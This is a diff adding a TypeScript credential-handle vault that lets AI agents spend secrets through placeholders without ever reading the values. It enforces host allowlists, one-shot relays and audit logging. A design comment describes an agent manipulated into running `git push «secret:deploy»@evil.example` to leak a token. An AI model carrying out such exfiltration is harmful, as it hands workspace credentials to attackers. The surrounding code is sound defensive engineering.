@@ -1,0 +1,1050 @@
+// THE CREDENTIALS AN AGENT MAY USE WITHOUT EVER READING.
+//
+// `secret-vault.ts` stops a credential in context from reaching a provider. This
+// is the other half: a way for an agent to USE one anyway — push with a PAT,
+// pull from a private registry, sign a build — while the value stays on this
+// side of the wire.
+//
+// HOW IT WORKS, in one line: the agent is given a NAME, and the platform
+// substitutes the VALUE at the boundary that spends it.
+//
+//   in context      "you may push with «secret:deploy.github_pat»"
+//   on the wire     the same string — the model never holds anything else
+//   at the boundary `resolveHandles` swaps it for the real token, once, for a
+//                   caller that has been granted it
+//
+// A DOC, NOT A ROW, because that is how credentials arrive. A deploy needs a
+// PAT, a registry password and a signing key TOGETHER; making somebody create
+// three unrelated secrets and remember which three go together is how the wrong
+// one gets used. A single secret is a doc with one entry, so there is one shape
+// to grant, audit and revoke.
+//
+// TWO LIFETIMES. A `vault` doc belongs to the workspace and persists. A `relay`
+// is one-shot: somebody pastes a credential into chat so an agent can do one
+// thing with it, and it is consumed on first resolve. The distinction is the
+// whole reason `uses_remaining` exists — a relay that outlived its errand would
+// be a durable secret nobody remembers creating.
+//
+// WHAT THIS DELIBERATELY DOES NOT DO: hand a value to anything that will show it
+// to a model. `resolveHandles` is for OUTBOUND boundaries — a header, a git
+// credential helper, a tool invocation — and its result must never be written
+// back into a transcript, a tool RESULT, or a record. The guard's `secret_leak`
+// remains the backstop for when something does.
+import { randomUUID } from 'node:crypto'
+import { logAudit } from './audit'
+import { db } from './db/pg'
+import { open, seal } from './secretbox'
+
+/** `«secret:doc»` or `«secret:doc.entry»`. The doc-only form resolves when the
+ *  doc holds exactly one entry, which is what makes a single secret feel like a
+ *  single secret while sharing the bundle's machinery. */
+const HANDLE = /«secret:([a-z0-9][a-z0-9_-]*)(?:\.([a-z0-9][a-z0-9_-]*))?»/gi
+
+export const handleFor = (doc: string, entry?: string): string => `«secret:${entry ? `${doc}.${entry}` : doc}»`
+
+/** Does this text name a handle at all? Cheap enough to ask on every turn, which
+ *  is what the chat path does before spending a word of prompt on explaining the
+ *  mechanism. Built fresh rather than reusing HANDLE: a `/g` regex carries
+ *  `lastIndex` between calls, so `.test()` on the shared one answers differently
+ *  depending on what asked before it. */
+export const mentionsHandle = (text: string): boolean => new RegExp(HANDLE.source, 'i').test(text)
+
+export type SecretKind = 'vault' | 'relay'
+
+export interface SecretEntryInput {
+  key: string
+  /** What KIND of credential — shown to humans and written to audit lines. Never
+   *  derived from the value, so it cannot leak one character of it. */
+  label: string
+  value: string
+}
+
+export interface SecretDoc {
+  id: string
+  name: string
+  title: string
+  kind: SecretKind
+  note: string | null
+  createdBy: string | null
+  createdAt: string
+  expiresAt: string | null
+  usesRemaining: number | null
+  lastUsedAt: string | null
+  /** Hosts this credential may be spent against. EMPTY = unrestricted, which is
+   *  what every secret predating the check has. */
+  allowedHosts: string[]
+  /** May a PERSON read this back? False for every agent credential, and there
+   *  is no path that flips it after creation — see `revealEntry`. */
+  revealable: boolean
+  /** Whose working secret this is. Null for workspace credentials, which belong
+   *  to the org rather than to a person. */
+  ownerUserId: string | null
+  /** Which SECRET folder it sits in — see `secret_folders`, which are the
+   *  Secrets view's own and nothing to do with Files. Null = loose. */
+  folderId: string | null
+  /** People who may reveal it. Names only ever leave here as ids. */
+  readers: string[]
+  /** KEYS AND LABELS ONLY. There is no shape of this type that carries a value —
+   *  every listing surface, every API response and every log line is built from
+   *  this, so the value has nowhere to escape to by accident. */
+  entries: Array<{ key: string; label: string }>
+  /** Agent models granted use. */
+  grants: string[]
+}
+
+/** Create a doc. `relay` docs default to a single use, which is what makes them
+ *  relays rather than secrets somebody forgot to delete. */
+export async function createSecretDoc(input: {
+  name: string
+  title: string
+  entries: SecretEntryInput[]
+  kind?: SecretKind
+  note?: string | null
+  createdBy?: string | null
+  expiresAt?: string | null
+  uses?: number | null
+  grantTo?: string[]
+  allowedHosts?: string[]
+  /** TRUE makes it a WORKING secret — a person can read it back. Defaults false,
+   *  which is what keeps every agent credential unreadable forever. */
+  revealable?: boolean
+  ownerUserId?: string | null
+  folderId?: string | null
+  /** User ids who may reveal it. Meaningless unless `revealable`. */
+  readers?: string[]
+}): Promise<SecretDoc> {
+  if (input.entries.length === 0) throw new Error('a secret needs at least one entry')
+  const sql = await db()
+  const kind: SecretKind = input.kind ?? 'vault'
+  const uses = input.uses !== undefined ? input.uses : kind === 'relay' ? 1 : null
+  const rows = (await sql`
+    insert into workspace_secrets (name, title, kind, note, created_by, expires_at, uses_remaining, allowed_hosts,
+                                  revealable, owner_user_id, secret_folder_id)
+    values (${input.name}, ${input.title}, ${kind}, ${input.note ?? null}, ${input.createdBy ?? null}, ${input.expiresAt ?? null}, ${uses},
+            ${(input.allowedHosts ?? []).map((h) => h.trim().toLowerCase()).filter(Boolean)},
+            ${input.revealable ?? false}, ${input.ownerUserId ?? null}, ${input.folderId ?? null})
+    returning id
+  `) as unknown as Array<{ id: string }>
+  const id = rows[0]!.id
+  for (const e of input.entries) {
+    await sql`
+      insert into workspace_secret_entries (secret_id, key, label, value_cipher)
+      values (${id}, ${e.key}, ${e.label}, ${seal(e.value)})
+    `
+  }
+  for (const reader of input.readers ?? []) {
+    await sql`insert into workspace_secret_readers (secret_id, user_id, granted_by) values (${id}, ${reader}, ${input.createdBy ?? null})
+              on conflict do nothing`
+  }
+  for (const agent of input.grantTo ?? []) {
+    await sql`insert into workspace_secret_grants (secret_id, agent_model, granted_by) values (${id}, ${agent}, ${input.createdBy ?? null})
+              on conflict do nothing`
+  }
+  const doc = await getSecretDoc(input.name)
+  if (!doc) throw new Error('secret was created but could not be read back')
+  return doc
+}
+
+/** HOW LONG AN UNSPENT RELAY LIVES.
+ *
+ *  A relay is for the errand happening in this conversation, now. If the agent
+ *  did not spend it while somebody was sitting there watching, the safe answer
+ *  is to hand it over again rather than to leave a credential in the workspace
+ *  that nobody remembers pasting. An hour is long enough for a queued turn and
+ *  short enough that a changed mind costs nothing.
+ *
+ *  Anything that genuinely needs to outlive the conversation is a vault doc, and
+ *  that is a deliberate trip through the admin panel. */
+export const RELAY_TTL_MS = 60 * 60 * 1000
+
+/** MINT A ONE-SHOT FROM A CONVERSATION.
+ *
+ *  The whole point is the asymmetry: the VALUE arrives here, over one request,
+ *  and what goes back is a NAME. The caller — a chat composer — never holds
+ *  anything it could paste into a transcript by accident, because the only thing
+ *  it was given is the handle.
+ *
+ *  Granted to exactly one agent, spendable exactly once, expiring within the
+ *  hour. Each of those three is a separate bound, and a relay has to clear all
+ *  of them: an errand that needs two uses is an errand somebody should watch
+ *  twice. */
+export async function mintRelay(input: {
+  label: string
+  value: string
+  agentModel: string
+  createdBy?: string | null
+  note?: string | null
+  /** Optional: pin the one-shot to the host it is for. A relay is already
+   *  bounded three ways; this is the fourth, and the only one that survives an
+   *  agent being talked into spending it somewhere else. */
+  allowedHosts?: string[]
+}): Promise<{ name: string; handle: string; label: string; expiresAt: string; allowedHosts: string[] }> {
+  // Random, not derived from the label: a guessable name is one another agent
+  // could ask for, and the grant check is the only thing that would stop it.
+  const name = `relay-${randomUUID().replace(/-/g, '').slice(0, 12)}`
+  const expiresAt = new Date(Date.now() + RELAY_TTL_MS).toISOString()
+  await createSecretDoc({
+    name,
+    title: input.label,
+    kind: 'relay',
+    // ONE ENTRY, so the bare `«secret:relay-…»` form resolves — a person copying
+    // a handle out of a chat message should not have to also copy a key.
+    entries: [{ key: 'value', label: input.label, value: input.value }],
+    note: input.note ?? null,
+    createdBy: input.createdBy ?? null,
+    expiresAt,
+    uses: 1,
+    grantTo: [input.agentModel],
+    ...(input.allowedHosts?.length ? { allowedHosts: input.allowedHosts } : {}),
+  })
+  return { name, handle: handleFor(name), label: input.label, expiresAt, allowedHosts: input.allowedHosts ?? [] }
+}
+
+/** One doc, keys and labels only. */
+export async function getSecretDoc(name: string): Promise<SecretDoc | null> {
+  const sql = await db()
+  const rows = (await sql`
+    select id, name, title, kind, note, created_by as "createdBy", created_at as "createdAt",
+           expires_at as "expiresAt", uses_remaining as "usesRemaining", last_used_at as "lastUsedAt",
+           coalesce(allowed_hosts, '{}') as "allowedHosts",
+           revealable, owner_user_id as "ownerUserId", secret_folder_id as "folderId"
+      from workspace_secrets where name = ${name}
+  `) as unknown as Array<Omit<SecretDoc, 'entries' | 'grants'>>
+  const row = rows[0]
+  if (!row) return null
+  const entries = (await sql`select key, label from workspace_secret_entries where secret_id = ${row.id} order by key`) as unknown as Array<{
+    key: string
+    label: string
+  }>
+  const grants = (await sql`select agent_model from workspace_secret_grants where secret_id = ${row.id}`) as unknown as Array<{ agent_model: string }>
+  const readers = (await sql`select user_id from workspace_secret_readers where secret_id = ${row.id}`) as unknown as Array<{ user_id: string }>
+  return { ...row, entries, grants: grants.map((g) => g.agent_model), readers: readers.map((r) => r.user_id) }
+}
+
+export async function listSecretDocs(): Promise<SecretDoc[]> {
+  const sql = await db()
+  const rows = (await sql`select name from workspace_secrets order by created_at desc`) as unknown as Array<{ name: string }>
+  const out: SecretDoc[] = []
+  for (const r of rows) {
+    const doc = await getSecretDoc(r.name)
+    if (doc) out.push(doc)
+  }
+  return out
+}
+
+export async function grantSecret(name: string, agentModel: string, grantedBy?: string | null): Promise<void> {
+  const sql = await db()
+  await sql`
+    insert into workspace_secret_grants (secret_id, agent_model, granted_by)
+    select id, ${agentModel}, ${grantedBy ?? null} from workspace_secrets where name = ${name}
+    on conflict do nothing
+  `
+}
+
+export async function revokeSecret(name: string, agentModel: string): Promise<void> {
+  const sql = await db()
+  await sql`
+    delete from workspace_secret_grants
+     where agent_model = ${agentModel}
+       and secret_id in (select id from workspace_secrets where name = ${name})
+  `
+}
+
+export async function deleteSecretDoc(name: string): Promise<void> {
+  const sql = await db()
+  await sql`delete from workspace_secrets where name = ${name}`
+}
+
+/** Why a handle did not resolve. Reported so an operator can fix it — and so a
+ *  caller never has to guess whether an unresolved handle meant "no such secret"
+ *  or "not yours". */
+export interface UnresolvedHandle {
+  handle: string
+  reason: 'unknown' | 'not-granted' | 'expired' | 'spent' | 'ambiguous' | 'destination'
+  /** For `destination`: where it was about to be spent. Named so an operator
+   *  reading the log learns which host to add — or which attack just failed. */
+  host?: string
+}
+
+// ── WHERE IS THIS CREDENTIAL ABOUT TO GO? ────────────────────────────────────
+//
+// The substitution has always been blind to destination: a handle resolves
+// wherever it appears, so an agent talked into `git push «secret:deploy»@
+// evil.example` hands over a live token and every layer downstream sees an
+// ordinary tool call. `allowed_hosts` is the fix, and this is the hard half of
+// it — the text being substituted into is arbitrary tool arguments, and the
+// destination has to be read out of them.
+//
+// DELIBERATELY NARROW, because the cost of a false POSITIVE here is a refused
+// legitimate call. A first pass matched anything with a dot in it and read
+// `package.json` and `index.ts` as hosts, which would have made an allowlisted
+// credential unusable inside any command that mentioned a file. So:
+//
+//   · URLs and git/ssh remotes, where the host is unambiguous, and
+//   · a BARE token standing alone as its own argument (`docker login … registry.
+//     outcrop.dev`, `curl … api.example.com`) whose last label is a plausible
+//     TLD and is not a file extension.
+//
+// What is NOT extractable is handled by refusing — see `resolveHandles`. An
+// unverifiable destination is not a verified one, and for a credential somebody
+// deliberately locked down that is the right direction to fail in.
+const URL_HOST = /(?:https?|ssh|git):\/\/(?:[^@/\s]*@)?([a-z0-9][a-z0-9.-]*[a-z0-9])(?::\d+)?/gi
+const SCP_HOST = /(?:^|[\s"'`])(?:[a-z0-9_.-]+@)([a-z0-9][a-z0-9.-]*[a-z0-9]):/gi
+const BARE_HOST = /(?:^|[\s"'`=])((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,24})(?=[\s"'`/:,]|$)/gi
+
+/** Extensions a bare `something.ext` token is far likelier to be than a host.
+ *  Not exhaustive and does not need to be: everything it misses fails CLOSED. */
+const FILE_EXT =
+  /^(?:json|jsonc|ts|tsx|js|jsx|mjs|cjs|md|mdx|ya?ml|txt|lock|toml|sh|bash|zsh|py|rb|go|rs|java|c|h|cpp|env|gz|tgz|tar|zip|png|jpe?g|gif|svg|ico|html?|css|scss|sql|xml|csv|tsv|log|cfg|ini|conf|pem|key|crt|pdf|so|dll|exe)$/i
+
+/** Every host this text would send something to, lowercased and deduped. */
+export function hostsIn(text: string): string[] {
+  const out = new Set<string>()
+  for (const re of [URL_HOST, SCP_HOST]) {
+    for (const m of text.matchAll(new RegExp(re.source, re.flags))) if (m[1]) out.add(m[1].toLowerCase())
+  }
+  for (const m of text.matchAll(new RegExp(BARE_HOST.source, BARE_HOST.flags))) {
+    const host = m[1]?.toLowerCase()
+    if (!host) continue
+    const ext = host.slice(host.lastIndexOf('.') + 1)
+    if (FILE_EXT.test(ext)) continue
+    out.add(host)
+  }
+  return [...out]
+}
+
+/** Is `host` covered by an allowlist entry? Exact, or a subdomain of one —
+ *  `github.com` covers `api.github.com` but never `github.com.evil.net`, which
+ *  is the whole reason this is not `endsWith`. */
+export const hostAllowed = (host: string, allowed: readonly string[]): boolean =>
+  allowed.some((a) => {
+    const entry = a.trim().toLowerCase().replace(/^\.+/, '')
+    return entry !== '' && (host === entry || host.endsWith(`.${entry}`))
+  })
+
+export interface Resolution {
+  text: string
+  /** Docs actually spent, for the audit line. Names, never values. */
+  used: Array<{ name: string; key: string; label: string }>
+  unresolved: UnresolvedHandle[]
+  /** Every destination this text would reach. Recorded on the spend whether or
+   *  not the secret restricts them — "where did our deploy key go" is a question
+   *  an operator asks AFTER something happened, and an unrestricted secret is
+   *  exactly the one nobody was watching. */
+  hosts: string[]
+}
+
+/** SUBSTITUTE HANDLES FOR VALUES, at an outbound boundary and nowhere else.
+ *
+ *  `caller` is the agent model asking. A handle it has not been granted does not
+ *  resolve, and the difference between "no such secret" and "not yours" is
+ *  reported to the OPERATOR rather than to the model — a caller that learns which
+ *  names exist has been handed a map of the workspace's credentials.
+ *
+ *  A RELAY IS SPENT HERE. `uses_remaining` decrements atomically in the same
+ *  statement that reads it, so two concurrent tool calls cannot both spend the
+ *  last use of a one-shot. */
+export async function resolveHandles(text: string, caller: string): Promise<Resolution> {
+  const found = [...text.matchAll(HANDLE)]
+  if (found.length === 0) return { text, used: [], unresolved: [], hosts: [] }
+
+  const sql = await db()
+  const used: Resolution['used'] = []
+  const unresolved: UnresolvedHandle[] = []
+  // Read ONCE, off the text the model wrote — before any substitution, so a
+  // credential that happens to contain a dot cannot invent a destination.
+  const hosts = hostsIn(text)
+  let out = text
+
+  for (const m of found) {
+    const handle = m[0]
+    const docName = (m[1] ?? '').toLowerCase()
+    const entryKey = m[2]?.toLowerCase() ?? null
+
+    const rows = (await sql`
+      select s.id, s.name, s.kind, s.expires_at as "expiresAt", s.uses_remaining as "usesRemaining",
+             s.allowed_hosts as "allowedHosts",
+             -- GRANTED DIRECTLY, OR THROUGH THE FOLDER IT SITS IN. Resolved
+             -- here rather than copied onto the row when a folder is shared,
+             -- so a credential added to that folder next week is covered
+             -- without anybody re-sharing it — which is the step everybody
+             -- forgets, and the reason a stale set stays readable by people
+             -- who should have lost it.
+             ((select count(*) from workspace_secret_grants g where g.secret_id = s.id and g.agent_model = ${caller})
+              + (select count(*) from secret_folder_grants fg where fg.folder_id = s.secret_folder_id and fg.agent_model = ${caller})) as "granted"
+        from workspace_secrets s
+       where lower(s.name) = ${docName}
+    `) as unknown as Array<{
+      id: string
+      name: string
+      kind: SecretKind
+      expiresAt: string | null
+      usesRemaining: number | null
+      allowedHosts: string[] | null
+      granted: string
+    }>
+    const doc = rows[0]
+    if (!doc) {
+      unresolved.push({ handle, reason: 'unknown' })
+      continue
+    }
+    if (Number(doc.granted) === 0) {
+      unresolved.push({ handle, reason: 'not-granted' })
+      continue
+    }
+    if (doc.expiresAt && new Date(doc.expiresAt).getTime() <= Date.now()) {
+      unresolved.push({ handle, reason: 'expired' })
+      continue
+    }
+
+    // ── WHERE IS IT GOING? ────────────────────────────────────────────────────
+    //
+    // BEFORE THE SPEND, deliberately: a refusal here must not consume a use of a
+    // one-shot. An attacker who could burn a relay just by naming a bad host
+    // would have a denial-of-service on every credential in the workspace.
+    //
+    // An EMPTY allowlist means unrestricted, which is what every secret created
+    // before this existed has — so nothing that worked yesterday stops working.
+    // A non-empty one is an operator saying "this credential is for these hosts",
+    // and then:
+    //
+    //   · a host that is not covered REFUSES, and
+    //   · NO VISIBLE HOST AT ALL ALSO REFUSES.
+    //
+    // The second half is the one worth defending. `hostsIn` is narrow on purpose
+    // and there are real commands it cannot read a destination out of; treating
+    // "I could not tell" as "it must be fine" would let any attacker who phrases
+    // the exfiltration unusually walk straight past the check. An unverifiable
+    // destination is not a verified one, and the operator who locked this
+    // credential down asked for exactly this answer.
+    const allowed = doc.allowedHosts ?? []
+    if (allowed.length > 0) {
+      const bad = hosts.find((h) => !hostAllowed(h, allowed))
+      if (bad !== undefined) {
+        unresolved.push({ handle, reason: 'destination', host: bad })
+        continue
+      }
+      if (hosts.length === 0) {
+        unresolved.push({ handle, reason: 'destination' })
+        continue
+      }
+    }
+
+    const entries = (await sql`
+      select key, label, value_cipher as "cipher" from workspace_secret_entries where secret_id = ${doc.id} order by key
+    `) as unknown as Array<{ key: string; label: string; cipher: string }>
+    // The doc-only form is only unambiguous when there is one entry. Guessing
+    // which of four credentials was meant is how the wrong one gets spent.
+    const entry = entryKey ? entries.find((e) => e.key.toLowerCase() === entryKey) : entries.length === 1 ? entries[0] : undefined
+    if (!entry) {
+      unresolved.push({ handle, reason: entryKey ? 'unknown' : 'ambiguous' })
+      continue
+    }
+
+    // SPEND IT IN THE SAME STATEMENT THAT CHECKS IT. Two concurrent tool calls
+    // must not both take the last use of a one-shot, and a read-then-write would
+    // let them.
+    let exhausted = false
+    if (doc.usesRemaining !== null) {
+      const spent = (await sql`
+        update workspace_secrets set uses_remaining = uses_remaining - 1, last_used_at = now()
+         where id = ${doc.id} and uses_remaining > 0
+        returning id
+      `) as unknown as Array<{ id: string }>
+      if (spent.length === 0) {
+        unresolved.push({ handle, reason: 'spent' })
+        continue
+      }
+      exhausted = doc.usesRemaining - 1 <= 0
+    } else {
+      await sql`update workspace_secrets set last_used_at = now() where id = ${doc.id}`
+    }
+
+    let value: string
+    try {
+      value = open(entry.cipher)
+    } catch {
+      // Key material changed under us. Refusing is the only safe answer — a
+      // half-decrypted credential is worse than none.
+      unresolved.push({ handle, reason: 'unknown' })
+      continue
+    }
+    out = out.split(handle).join(value)
+
+    // A CREDENTIAL WITH NO USES LEFT IS DESTROYED, NOT RETAINED. `uses_remaining`
+    // already refuses to resolve it, so keeping the ciphertext buys nothing and
+    // costs the one thing worth protecting: a one-shot somebody pasted into chat
+    // this morning should not still be recoverable from a database dump tonight.
+    // The row survives, so the audit trail — who minted it, who spent it, when —
+    // survives with it. Emptied rather than deleted because that history is the
+    // only reason to keep a spent relay at all.
+    if (exhausted) {
+      await sql`update workspace_secret_entries set value_cipher = '' where secret_id = ${doc.id}`
+    }
+    used.push({ name: doc.name, key: entry.key, label: entry.label })
+
+    // ── THE ONE EVENT WORTH AUDITING, AND THE ONE THAT WAS NOT ────────────────
+    //
+    // Minting, granting, revoking and deleting all wrote audit rows from the
+    // day they existed. The SPEND — the only moment a credential actually
+    // MOVES — was a console.warn, which means "where did our deploy key go"
+    // stopped being answerable at the next log rotation. That is the question
+    // an incident opens with.
+    //
+    // HERE RATHER THAN AT THE CALL SITES, because there are two of them
+    // (`callMcpTool` and the MCP gateway) and a third will exist eventually. A
+    // record every boundary writes for itself is a record that drifts.
+    //
+    // NAMES, KINDS AND DESTINATIONS — never a value, and never the text it was
+    // substituted into, which by definition now contains one.
+    void logAudit({
+      actor: caller,
+      action: 'secrets.spend',
+      targetType: 'secret',
+      targetId: doc.name,
+      targetLabel: entry.label,
+      after: { key: entry.key, hosts, kind: doc.kind, exhausted, restricted: allowed.length > 0 },
+    })
+  }
+
+  return { text: out, used, unresolved, hosts }
+}
+
+/** A JSON-RPC envelope, as much of one as spending a credential needs to know. */
+export interface ToolCallRpc {
+  method?: string
+  params?: { name?: string; arguments?: Record<string, unknown> }
+}
+
+/** SPEND HANDLES INSIDE AN MCP TOOL CALL — the agent-facing half of
+ *  `resolveHandles`, and the one that was missing.
+ *
+ *  `callMcpTool` carries the same substitution, but nothing on the AGENT path
+ *  reaches it: an agent's tool call arrives at `/api/mcp/gw/$server` as JSON-RPC
+ *  over its own credential, and that route forwarded the body it was handed. So
+ *  an agent granted `«secret:deploy.github_pat»` — told in its soul that it may
+ *  push with it — sent the literal handle upstream and got an auth failure it
+ *  could not explain. Advertising a credential we do not substitute is the same
+ *  class of lie as advertising a tool we cannot dispatch: nothing crashes, and
+ *  the agent looks incapable of a thing the platform promised it.
+ *
+ *  ARGUMENTS ONLY, AND ONLY ON `tools/call`. A tool RESULT comes back untouched:
+ *  it re-enters the model's context, and resolving a handle there would undo the
+ *  whole arrangement in one line.
+ *
+ *  MUTATES `rpc.params.arguments` in place and returns whether anything changed,
+ *  because the two dispatch paths downstream want different things — the
+ *  in-process ones take the object, the HTTP one re-serializes — and only when
+ *  something was actually spent. Every other call forwards byte-for-byte as
+ *  before, so a re-serialization round trip is not something a working tool has
+ *  to survive. */
+export async function spendHandlesInToolCall(rpc: ToolCallRpc | null, caller: string): Promise<{ changed: boolean; used: Resolution['used']; unresolved: UnresolvedHandle[] }> {
+  const none = { changed: false, used: [], unresolved: [] }
+  if (rpc?.method !== 'tools/call' || !rpc.params?.arguments) return none
+  const resolved = await resolveHandles(JSON.stringify(rpc.params.arguments), caller)
+  if (resolved.used.length === 0) return { ...none, unresolved: resolved.unresolved }
+  try {
+    rpc.params.arguments = JSON.parse(resolved.text) as Record<string, unknown>
+  } catch {
+    // A credential containing something that broke the round trip. Forward the
+    // call unresolved rather than a malformed body and let the tool refuse —
+    // but still report the spend, because it happened.
+    return { changed: false, used: resolved.used, unresolved: resolved.unresolved }
+  }
+  return { changed: true, used: resolved.used, unresolved: resolved.unresolved }
+}
+
+// ── WORKING SECRETS: read, share, unshare ────────────────────────────────────
+//
+// THE ONE PLACE A VALUE COMES BACK. Everything else in this file moves a
+// credential OUTWARD — to a tool, to a host — and never to a reader. This does
+// the opposite, so every guard it carries is load-bearing rather than decorative.
+
+/** Why a reveal was refused. Told to the CALLER here, unlike the resolve path:
+ *  a person asking for a secret they own or were shared is entitled to know
+ *  which of those failed, and cannot learn anything from it they did not
+ *  already know. */
+export type RevealRefusal = 'unknown' | 'not-revealable' | 'not-shared' | 'expired' | 'no-such-entry' | 'destroyed'
+
+export interface RevealResult {
+  ok: boolean
+  value?: string
+  refusal?: RevealRefusal
+}
+
+/** REVEAL ONE ENTRY, for one person, once.
+ *
+ *  FOUR THINGS HAVE TO BE TRUE, and `revealable` is the one that matters most:
+ *  a credential created for an AGENT to spend has it false, and there is no
+ *  route, permission or admin override that flips it. That is what keeps the
+ *  promise the rest of this file makes — "no read path returns a value" — true
+ *  for every credential it was ever made about. This function adds a reader for
+ *  a DIFFERENT noun rather than punching a hole in the old one.
+ *
+ *  BEING AN ADMIN IS NOT ONE OF THE FOUR. Reveal is a grant, not a role. An
+ *  admin can see that a working secret exists and can delete it — governance is
+ *  their job — but reading somebody's staging key because you administer the
+ *  workspace is the behaviour that makes people go back to pasting keys into
+ *  Slack, where nobody can see them at all.
+ *
+ *  ONE ENTRY AT A TIME, by key, so a bundle cannot be drained by one call and
+ *  the audit line says which credential was actually looked at. */
+export async function revealEntry(name: string, entryKey: string, userId: string, actorLabel?: string): Promise<RevealResult> {
+  const sql = await db()
+  const rows = (await sql`
+    select s.id, s.name, s.title, s.revealable, s.expires_at as "expiresAt", s.owner_user_id as "ownerUserId",
+           -- Shared with them directly, or through the folder. Same union as
+           -- the agent side, same reason.
+           ((select count(*) from workspace_secret_readers r where r.secret_id = s.id and r.user_id = ${userId})
+            + (select count(*) from secret_folder_readers fr where fr.folder_id = s.secret_folder_id and fr.user_id = ${userId})) as "shared"
+      from workspace_secrets s
+     where s.name = ${name}
+  `) as unknown as Array<{
+    id: string
+    name: string
+    title: string
+    revealable: boolean
+    expiresAt: string | null
+    ownerUserId: string | null
+    shared: string
+  }>
+  const doc = rows[0]
+  if (!doc) return { ok: false, refusal: 'unknown' }
+  // THE GUARANTEE, ENFORCED FIRST. An agent credential is not readable by
+  // anybody, including whoever created it.
+  if (!doc.revealable) return { ok: false, refusal: 'not-revealable' }
+  if (doc.ownerUserId !== userId && Number(doc.shared) === 0) return { ok: false, refusal: 'not-shared' }
+  if (doc.expiresAt && new Date(doc.expiresAt).getTime() <= Date.now()) return { ok: false, refusal: 'expired' }
+
+  const entries = (await sql`
+    select key, label, value_cipher as "cipher" from workspace_secret_entries where secret_id = ${doc.id} and key = ${entryKey}
+  `) as unknown as Array<{ key: string; label: string; cipher: string }>
+  const entry = entries[0]
+  if (!entry) return { ok: false, refusal: 'no-such-entry' }
+  // A spent one-shot has had its ciphertext emptied. Say so plainly rather than
+  // handing back an empty string that reads as a credential.
+  if (entry.cipher === '') return { ok: false, refusal: 'destroyed' }
+
+  let value: string
+  try {
+    value = open(entry.cipher)
+  } catch {
+    return { ok: false, refusal: 'destroyed' }
+  }
+
+  // EVERY LOOK IS WRITTEN DOWN. This is the whole difference between a shared
+  // vault and a key in a Slack thread: not that fewer people can see it, but
+  // that seeing it leaves a mark. Names and labels; the value is the one thing
+  // that must never be in the row recording that somebody read the value.
+  void logAudit({
+    // The LABEL, falling back to the id. Access is decided by `userId` and
+    // nothing else; this is only what a human reads at 2am, and an audit log
+    // that mixes emails and uuids for the same actor is one nobody can follow.
+    actor: actorLabel ?? userId,
+    action: 'secrets.reveal',
+    targetType: 'secret',
+    targetId: doc.name,
+    targetLabel: entry.label,
+    after: { key: entry.key, title: doc.title },
+  })
+  await sql`update workspace_secrets set last_used_at = now() where id = ${doc.id}`
+  return { ok: true, value }
+}
+
+/** Let somebody else read it. Owner-only — a reader cannot widen the circle they
+ *  were let into, which is the difference between sharing and forwarding. */
+export async function shareSecretWith(name: string, userId: string, actingUserId: string): Promise<boolean> {
+  const sql = await db()
+  const rows = (await sql`select id, owner_user_id as "ownerUserId", revealable from workspace_secrets where name = ${name}`) as unknown as Array<{
+    id: string
+    ownerUserId: string | null
+    revealable: boolean
+  }>
+  const doc = rows[0]
+  if (!doc || !doc.revealable || doc.ownerUserId !== actingUserId) return false
+  await sql`insert into workspace_secret_readers (secret_id, user_id, granted_by) values (${doc.id}, ${userId}, ${actingUserId})
+            on conflict do nothing`
+  return true
+}
+
+export async function unshareSecretFrom(name: string, userId: string, actingUserId: string): Promise<boolean> {
+  const sql = await db()
+  const rows = (await sql`select id, owner_user_id as "ownerUserId" from workspace_secrets where name = ${name}`) as unknown as Array<{
+    id: string
+    ownerUserId: string | null
+  }>
+  const doc = rows[0]
+  if (!doc || doc.ownerUserId !== actingUserId) return false
+  await sql`delete from workspace_secret_readers where secret_id = ${doc.id} and user_id = ${userId}`
+  return true
+}
+
+// ── SECRET FOLDERS ───────────────────────────────────────────────────────────
+//
+// The Secrets view's own organisation, and nothing to do with Files. Flat, on
+// purpose: a person with thirty credentials wants six labelled piles, not a
+// tree — and a tree is where "which folder was that in" starts costing more
+// than the tidying saved.
+
+export interface SecretFolder {
+  id: string
+  name: string
+  ownerUserId: string | null
+  createdAt: string
+  /** People the whole folder is shared with. */
+  readers: string[]
+  /** Agents that may SPEND everything in it — handle only, as ever. */
+  grants: string[]
+  /** How many secrets are filed here. */
+  count: number
+}
+
+/** `opts.workspace` asks for the ORG's folders instead of a person's — the ones
+ *  with no owner, which group agent credentials in Admin → Secrets. Two callers,
+ *  one shape, because "a folder of credentials shared as a set" is the same idea
+ *  whether the set belongs to a person or to the workspace. */
+export async function listSecretFolders(userId: string, opts?: { workspace?: boolean }): Promise<SecretFolder[]> {
+  const sql = await db()
+  const rows = (
+    opts?.workspace
+      ? await sql`
+          select f.id, f.name, f.owner_user_id as "ownerUserId", f.created_at as "createdAt"
+            from secret_folders f where f.owner_user_id is null order by f.name
+        `
+      : await sql`
+          select distinct f.id, f.name, f.owner_user_id as "ownerUserId", f.created_at as "createdAt"
+            from secret_folders f
+            left join secret_folder_readers fr on fr.folder_id = f.id and fr.user_id = ${userId}
+           where f.owner_user_id = ${userId} or fr.user_id is not null
+           order by f.name
+        `
+  ) as unknown as Array<{ id: string; name: string; ownerUserId: string | null; createdAt: string }>
+  const out: SecretFolder[] = []
+  for (const f of rows) {
+    const readers = (await sql`select user_id from secret_folder_readers where folder_id = ${f.id}`) as unknown as Array<{ user_id: string }>
+    const grants = (await sql`select agent_model from secret_folder_grants where folder_id = ${f.id}`) as unknown as Array<{ agent_model: string }>
+    const n = (await sql`select count(*)::int as n from workspace_secrets where secret_folder_id = ${f.id}`) as unknown as Array<{ n: number }>
+    out.push({ ...f, readers: readers.map((r) => r.user_id), grants: grants.map((g) => g.agent_model), count: n[0]?.n ?? 0 })
+  }
+  return out
+}
+
+/** `ownerUserId: null` makes a WORKSPACE folder — the org's, for grouping agent
+ *  credentials. Anything an admin creates from Admin → Secrets is one of these,
+ *  so it does not vanish with the account that made it. */
+export async function createSecretFolder(name: string, ownerUserId: string | null): Promise<SecretFolder> {
+  const sql = await db()
+  const rows = (await sql`insert into secret_folders (name, owner_user_id) values (${name}, ${ownerUserId}) returning id, name, owner_user_id as "ownerUserId", created_at as "createdAt"`) as unknown as Array<{
+    id: string
+    name: string
+    ownerUserId: string | null
+    createdAt: string
+  }>
+  return { ...rows[0]!, readers: [], grants: [], count: 0 }
+}
+
+/** A folder is yours if you own it — or, for a WORKSPACE folder (owner null),
+ *  if you administer the workspace. Nobody "owns" the org's credentials, and
+ *  requiring an owner match on them would make them permanently unmanageable. */
+const ownsFolder = async (id: string, userId: string, isAdmin = false): Promise<boolean> => {
+  const sql = await db()
